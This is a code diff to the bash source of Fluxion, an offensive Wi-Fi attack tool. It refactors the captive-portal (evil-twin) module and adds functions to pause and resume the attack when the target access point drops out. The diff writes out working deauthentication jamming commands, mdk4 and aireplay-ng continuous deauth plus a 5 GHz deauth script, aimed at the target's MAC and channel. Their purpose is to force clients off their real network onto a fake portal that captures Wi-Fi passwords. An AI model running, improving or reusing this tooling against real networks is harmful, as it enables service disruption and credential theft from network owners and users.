@@ -1397,6 +1397,66 @@ save_attack() {
   echo "$CaptivePortalJammerType" >> "$configurationPath"
 }
 
+captive_portal_stop_jammer_service() {
+  if [ "$CaptivePortalJammerServiceXtermPID" ]; then
+    fluxion_kill_lineage $CaptivePortalJammerServiceXtermPID
+    CaptivePortalJammerServiceXtermPID=""
+  fi
+  sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
+}
+
+captive_portal_start_jammer_service() {
+  if [ "$CaptivePortalJammerServiceXtermPID" ]; then return 0; fi
+
+  echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
+  echo -e "$FluxionTargetMAC" > "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
+
+  local currentMode=$(iw dev "$CaptivePortalJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
+  if [ "$currentMode" != "monitor" ]; then
+    interface_set_mode "$CaptivePortalJammerInterface" monitor &> $FLUXIONOutputDevice
+    sleep 1
+  fi
+
+  if [ $FLUXIONEnable5GHZ -eq 1 ]; then
+    fluxion_window_open CaptivePortalJammerServiceXtermPID \
+      "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+      "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC"
+  elif [[ $option_deauth -eq 1 ]]; then
+    fluxion_window_open CaptivePortalJammerServiceXtermPID \
+      "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+      "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\""
+  elif [[ $option_deauth -eq 2 ]]; then
+    fluxion_window_open CaptivePortalJammerServiceXtermPID \
+      "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+      "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
+  fi
+}
+
+# Resume the AP service and routes without killing DHCP/DNS/web services.
+captive_portal_resume_interface() {
+  if [ "$CaptivePortalAPService" ]; then
+    ap_service_start || return 1
+  fi
+  captive_portal_set_routes &
+  sleep 3
+}
+
+pause_attack() {
+  if [ "$CaptivePortalState" != "Running" ]; then return 0; fi
+  echo "Pausing Captive Portal attack (target AP disappeared)." > $FLUXIONOutputDevice
+  captive_portal_stop_jammer_service
+  captive_portal_stop_interface
+  CaptivePortalState="Paused"
+}
+
+resume_attack() {
+  if [ "$CaptivePortalState" != "Paused" ]; then return 0; fi
+  echo "Resuming Captive Portal attack (target AP reappeared)." > $FLUXIONOutputDevice
+  captive_portal_resume_interface
+  captive_portal_start_jammer_service
+  CaptivePortalState="Running"
+}
+
 stop_attack() {
   local -r CaptivePortalAuthSuccessFlag="$FLUXIONWorkspacePath/authenticator_success.flag"
   local skip_authenticator_kill=0
@@ -1427,11 +1487,7 @@ stop_attack() {
       &> $FLUXIONOutputDevice
   fi
 
-  if [ "$CaptivePortalJammerServiceXtermPID" ]; then
-    fluxion_kill_lineage $CaptivePortalJammerServiceXtermPID
-    CaptivePortalJammerServiceXtermPID="" # Clear parent PID
-  fi
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
+  captive_portal_stop_jammer_service
 
   # Kill captive portal web server log viewer.
   if [ "$CaptivePortalWebServiceXtermPID" ]; then
@@ -1506,6 +1562,7 @@ start_attack() {
   CaptivePortalState="Running"
 
   stop_attack
+  CaptivePortalState="Running"  # restore — stop_attack resets it to "Stopped"
 
   if [ "$CaptivePortalNetworkManagerShutoff" != "disabled" ]; then
     CaptivePortalDisabledNetworkManager=""
@@ -1575,37 +1632,7 @@ start_attack() {
   echo "Web Service: $CaptivePortalWebServiceXtermPID" \
     >> $FLUXIONOutputDevice
 
-  echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
-  echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk4_blacklist.lst"
-
-  # Ensure jammer interface is in monitor mode before starting
-  # This prevents "ARPHRD_IEEE80211" errors during tracker restarts
-  # Only set mode if not already in monitor mode to avoid disrupting the interface
-  echo "Verifying jammer interface monitor mode..." > $FLUXIONOutputDevice
-  local currentMode=$(iw dev "$CaptivePortalJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
-  if [ "$currentMode" != "monitor" ]; then
-    echo "Setting jammer interface to monitor mode (current: $currentMode)..." > $FLUXIONOutputDevice
-    if ! interface_set_mode "$CaptivePortalJammerInterface" monitor &> $FLUXIONOutputDevice; then
-      echo "Warning: Failed to set jammer interface to monitor mode" > $FLUXIONOutputDevice
-    fi
-    sleep 1
-  else
-    echo "Jammer interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
-  fi
-
-  if [ $FLUXIONEnable5GHZ -eq 1 ]; then
-    fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-        "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC"
-  elif [[ $option_deauth -eq 1 ]]; then
-    fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-        "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\""
-  elif [[ $option_deauth -eq 2 ]]; then
-    fluxion_window_open CaptivePortalJammerServiceXtermPID \
-        "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-        "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
-  fi
+  captive_portal_start_jammer_service
   echo "Jammer Service: $CaptivePortalJammerServiceXtermPID" \
     >> $FLUXIONOutputDevice
 
